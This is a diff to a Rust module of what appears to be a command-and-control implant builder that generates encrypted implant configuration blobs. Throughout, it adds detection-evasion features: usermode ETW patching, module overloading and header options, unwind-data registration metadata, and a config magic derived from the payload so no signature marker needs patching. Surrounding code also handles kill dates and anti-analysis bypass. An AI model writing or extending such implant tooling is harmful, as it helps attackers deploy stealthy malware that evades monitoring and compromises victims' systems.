@@ -45,6 +45,17 @@ pub struct GeneratedConfig {
     pub implant_pubkey: [u8; 32],
 }
 
+/// Build-derived PIC layout metadata carried to the implant.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct PicLayoutMetadata {
+    /// First page offset that must remain writable for mutable state.
+    pub module_overload_rw_offset: u32,
+    /// Offset of the RUNTIME_FUNCTION table in the raw PIC blob.
+    pub pdata_offset: u32,
+    /// Number of RUNTIME_FUNCTION entries.
+    pub pdata_count: u32,
+}
+
 // ── TLV field IDs for implant config ─────────────────────────────────────────
 
 mod config_field {
@@ -59,6 +70,9 @@ mod config_field {
     pub const EVASION_FLAGS: u8 = 0x88;
     pub const IMPLANT_PUBKEY: u8 = 0x89;
     pub const BUILD_FLAGS: u8 = 0x8A;
+    pub const MODULE_OVERLOAD_RW_OFFSET: u8 = 0x8B;
+    pub const PDATA_RANGE: u8 = 0x8C;
+    pub const MODULE_SIGNING_KEY: u8 = 0x8D;
 }
 
 /// Generate a complete implant config blob.
@@ -76,14 +90,20 @@ pub struct EvasionFlags {
     pub module_overloading: bool,
     pub pdata_registration: bool,
     pub ntcontinue_entry: bool,
+    pub etw_usermode_patch: bool,
+    pub module_preserve_headers: bool,
+    pub module_patch_only: bool,
 }
 
 impl Default for EvasionFlags {
     fn default() -> Self {
         Self {
-            module_overloading: true,
+            module_overloading: false,
             pdata_registration: false,
             ntcontinue_entry: false,
+            etw_usermode_patch: false,
+            module_preserve_headers: false,
+            module_patch_only: false,
         }
     }
 }
@@ -101,12 +121,22 @@ impl EvasionFlags {
         if self.ntcontinue_entry {
             flags |= 0x04;
         }
+        if self.etw_usermode_patch {
+            flags |= 0x08;
+        }
+        if self.module_preserve_headers {
+            flags |= 0x10;
+        }
+        if self.module_patch_only {
+            flags |= 0x20;
+        }
         flags
     }
 }
 
 /// Default config magic used when no per-build magic is provided.
 pub const DEFAULT_CONFIG_MAGIC: u32 = 0x53504543; // "SPEC" little-endian
+pub const CONFIG_BLOB_VERSION: u32 = 2;
 
 pub fn generate_config(
     profile: &Profile,
@@ -131,8 +161,9 @@ pub fn generate_config(
 /// Generate a config blob using a per-build randomized config magic value.
 ///
 /// The `config_magic` replaces the fixed `0x53504543` ("SPEC") in both the
-/// config blob header and the AAD for AEAD encryption. The implant reads
-/// this magic from its patchable `cfg_magic_marker` region at runtime.
+/// config blob header and the AAD for AEAD encryption. Production payloads
+/// derive this from CRC32(pic_blob[0..64]) so no config-magic marker needs
+/// to be patched into the implant.
 pub fn generate_config_with_magic(
     profile: &Profile,
     server_pubkey: &PublicKey,
@@ -154,6 +185,7 @@ pub fn generate_config_with_magic(
         false,
         false,
         config_magic,
+        false,
     )
 }
 
@@ -179,11 +211,11 @@ pub fn generate_config_with_evasion(
         debug_mode,
         skip_anti_analysis,
         DEFAULT_CONFIG_MAGIC,
+        false,
     )
 }
 
-/// Inner config generation function that accepts a per-build config magic.
-fn generate_config_with_evasion_and_magic(
+pub fn generate_config_with_evasion_and_magic(
     profile: &Profile,
     server_pubkey: &PublicKey,
     channels: &[ChannelConfig],
@@ -194,6 +226,105 @@ fn generate_config_with_evasion_and_magic(
     debug_mode: bool,
     skip_anti_analysis: bool,
     config_magic: u32,
+    disable_profile: bool,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_inner(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        evasion,
+        pic_blob,
+        debug_mode,
+        skip_anti_analysis,
+        config_magic,
+        disable_profile,
+        None,
+        None,
+    )
+}
+
+#[allow(clippy::too_many_arguments)]
+pub fn generate_config_with_evasion_magic_and_layout(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
+    pic_blob: &[u8],
+    debug_mode: bool,
+    skip_anti_analysis: bool,
+    config_magic: u32,
+    disable_profile: bool,
+    layout: Option<PicLayoutMetadata>,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_inner(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        evasion,
+        pic_blob,
+        debug_mode,
+        skip_anti_analysis,
+        config_magic,
+        disable_profile,
+        layout,
+        None,
+    )
+}
+
+#[allow(clippy::too_many_arguments)]
+pub fn generate_config_with_evasion_magic_layout_and_module_key(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
+    pic_blob: &[u8],
+    debug_mode: bool,
+    skip_anti_analysis: bool,
+    config_magic: u32,
+    disable_profile: bool,
+    layout: Option<PicLayoutMetadata>,
+    module_signing_key: Option<[u8; 32]>,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_inner(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        evasion,
+        pic_blob,
+        debug_mode,
+        skip_anti_analysis,
+        config_magic,
+        disable_profile,
+        layout,
+        module_signing_key,
+    )
+}
+
+/// Inner config generation function that accepts a per-build config magic.
+fn generate_config_inner(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
+    pic_blob: &[u8],
+    debug_mode: bool,
+    skip_anti_analysis: bool,
+    config_magic: u32,
+    disable_profile: bool,
+    layout: Option<PicLayoutMetadata>,
+    module_signing_key: Option<[u8; 32]>,
 ) -> Result<GeneratedConfig, BuilderError> {
     if channels.is_empty() {
         return Err(BuilderError::Config(
@@ -205,9 +336,13 @@ fn generate_config_with_evasion_and_magic(
     let implant_secret = StaticSecret::random_from_rng(rand::thread_rng());
     let implant_pubkey = PublicKey::from(&implant_secret);
 
-    // 2. Compile profile to TLV
-    let profile_blob = compile_profile(profile)
-        .map_err(|e| BuilderError::Config(format!("profile compilation failed: {e}")))?;
+    // 2. Compile profile to TLV when profile transport is enabled.
+    let profile_blob = if disable_profile {
+        Vec::new()
+    } else {
+        compile_profile(profile)
+            .map_err(|e| BuilderError::Config(format!("profile compilation failed: {e}")))?
+    };
 
     // 3. Serialize config fields as TLV
     let mut plaintext = Vec::with_capacity(4096);
@@ -233,6 +368,14 @@ fn generate_config_with_evasion_and_magic(
         implant_pubkey.as_bytes(),
     );
 
+    if let Some(signing_key) = module_signing_key {
+        tlv_bytes(
+            &mut plaintext,
+            config_field::MODULE_SIGNING_KEY,
+            &signing_key,
+        );
+    }
+
     // Channels
     for ch in channels {
         tlv_string(&mut plaintext, config_field::CHANNEL_KIND, &ch.kind);
@@ -257,7 +400,9 @@ fn generate_config_with_evasion_and_magic(
     }
 
     // Compiled profile blob
-    tlv_bytes(&mut plaintext, config_field::PROFILE_BLOB, &profile_blob);
+    if !disable_profile {
+        tlv_bytes(&mut plaintext, config_field::PROFILE_BLOB, &profile_blob);
+    }
 
     // Evasion flags (single byte bitfield)
     let evasion_byte = evasion.to_byte();
@@ -273,8 +418,27 @@ fn generate_config_with_evasion_and_magic(
     if skip_anti_analysis {
         build_flags |= 0x02;
     }
+    if disable_profile {
+        build_flags |= 0x04;
+    }
     if build_flags != 0 {
         tlv_bytes(&mut plaintext, config_field::BUILD_FLAGS, &[build_flags]);
+    }
+
+    if let Some(layout) = layout {
+        if layout.module_overload_rw_offset != 0 {
+            tlv_bytes(
+                &mut plaintext,
+                config_field::MODULE_OVERLOAD_RW_OFFSET,
+                &layout.module_overload_rw_offset.to_le_bytes(),
+            );
+        }
+        if layout.pdata_offset != 0 && layout.pdata_count != 0 {
+            let mut pdata = [0u8; 8];
+            pdata[..4].copy_from_slice(&layout.pdata_offset.to_le_bytes());
+            pdata[4..].copy_from_slice(&layout.pdata_count.to_le_bytes());
+            tlv_bytes(&mut plaintext, config_field::PDATA_RANGE, &pdata);
+        }
     }
 
     // 4. Derive encryption key.
@@ -297,15 +461,21 @@ fn generate_config_with_evasion_and_magic(
 
     // AAD = magic + version (first 8 bytes of CONFIG_BLOB_HEADER).
     // The implant passes these as additional authenticated data during decryption.
-    // When config_magic is per-build randomized, the implant reads it from
-    // the patchable cfg_magic_marker region to construct the same AAD.
+    // Production builds derive config_magic from CRC32(pic_blob[0..64]) so
+    // the implant can construct the same AAD without a patchable marker.
     let mut aad = [0u8; 8];
     aad[..4].copy_from_slice(&config_magic.to_le_bytes());
-    aad[4..8].copy_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
+    aad[4..8].copy_from_slice(&CONFIG_BLOB_VERSION.to_le_bytes()); // CONFIG_VERSION
 
     use chacha20poly1305::aead::Payload;
     let ciphertext_with_tag = cipher
-        .encrypt(nonce, Payload { msg: &plaintext, aad: &aad })
+        .encrypt(
+            nonce,
+            Payload {
+                msg: &plaintext,
+                aad: &aad,
+            },
+        )
         .map_err(|e| BuilderError::Config(format!("config encryption failed: {e}")))?;
 
     // ChaCha20-Poly1305 appends 16-byte tag to ciphertext.
@@ -319,7 +489,7 @@ fn generate_config_with_evasion_and_magic(
     let data_size = ciphertext.len() as u32;
     let mut config_blob = Vec::with_capacity(4 + 4 + 4 + 12 + 16 + ciphertext.len());
     config_blob.extend_from_slice(&config_magic.to_le_bytes()); // CONFIG_MAGIC (per-build)
-    config_blob.extend_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
+    config_blob.extend_from_slice(&CONFIG_BLOB_VERSION.to_le_bytes()); // CONFIG_VERSION
     config_blob.extend_from_slice(&data_size.to_le_bytes()); // data_size
     config_blob.extend_from_slice(&nonce_bytes); // nonce (12 bytes)
     config_blob.extend_from_slice(tag); // AEAD tag (16 bytes)
@@ -353,7 +523,7 @@ fn derive_pic_key(pic_blob: &[u8]) -> [u8; 32] {
 
 fn tlv_bytes(buf: &mut Vec<u8>, field_id: u8, data: &[u8]) {
     buf.push(field_id);
-    let len = data.len() as u16;
+    let len = data.len() as u32;
     buf.extend_from_slice(&len.to_le_bytes());
     buf.extend_from_slice(data);
 }
@@ -445,7 +615,7 @@ transform:
         let magic = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
         assert_eq!(magic, 0x53504543, "CONFIG_MAGIC should be 'SPEC'");
         let version = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]);
-        assert_eq!(version, 1);
+        assert_eq!(version, CONFIG_BLOB_VERSION);
         let data_size = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]) as usize;
         let nonce_bytes = &blob[12..24];
         let tag = &blob[24..40];
@@ -467,17 +637,28 @@ transform:
         use chacha20poly1305::aead::Payload;
         let aad = &blob[0..8]; // magic + version
         let plaintext = cipher
-            .decrypt(nonce, Payload { msg: ct_with_tag.as_slice(), aad })
+            .decrypt(
+                nonce,
+                Payload {
+                    msg: ct_with_tag.as_slice(),
+                    aad,
+                },
+            )
             .expect("decryption should succeed");
 
         // Verify TLV structure: walk entries
         let mut pos = 0;
         let mut fields_seen = Vec::new();
         while pos < plaintext.len() {
-            assert!(pos + 3 <= plaintext.len(), "truncated TLV");
+            assert!(pos + 5 <= plaintext.len(), "truncated TLV");
             let fid = plaintext[pos];
-            let len = u16::from_le_bytes([plaintext[pos + 1], plaintext[pos + 2]]) as usize;
-            pos += 3 + len;
+            let len = u32::from_le_bytes([
+                plaintext[pos + 1],
+                plaintext[pos + 2],
+                plaintext[pos + 3],
+                plaintext[pos + 4],
+            ]) as usize;
+            pos += 5 + len;
             fields_seen.push(fid);
         }
         assert_eq!(pos, plaintext.len(), "trailing bytes");
@@ -510,6 +691,28 @@ transform:
         // Different keypairs → different blobs
         assert_ne!(r1.implant_pubkey, r2.implant_pubkey);
         assert_ne!(r1.config_blob, r2.config_blob);
+    }
+
+    #[test]
+    fn test_evasion_flags_etw_usermode_patch_bit() {
+        let f = EvasionFlags {
+            module_overloading: false,
+            pdata_registration: false,
+            ntcontinue_entry: false,
+            etw_usermode_patch: true,
+            module_preserve_headers: false,
+            module_patch_only: false,
+        };
+        assert_eq!(f.to_byte(), 0x08);
+        let all = EvasionFlags {
+            module_overloading: true,
+            pdata_registration: true,
+            ntcontinue_entry: true,
+            etw_usermode_patch: true,
+            module_preserve_headers: true,
+            module_patch_only: true,
+        };
+        assert_eq!(all.to_byte(), 0x3F);
     }
 
     #[test]
@@ -548,9 +751,9 @@ transform:
         let magic = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
         assert_eq!(magic, custom_magic, "CONFIG_MAGIC should be custom value");
 
-        // Version should still be 1
+        // Version should still match the current config blob version.
         let version = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]);
-        assert_eq!(version, 1);
+        assert_eq!(version, CONFIG_BLOB_VERSION);
 
         // The old magic (0x53504543) should NOT appear in the header
         assert_ne!(magic, DEFAULT_CONFIG_MAGIC);
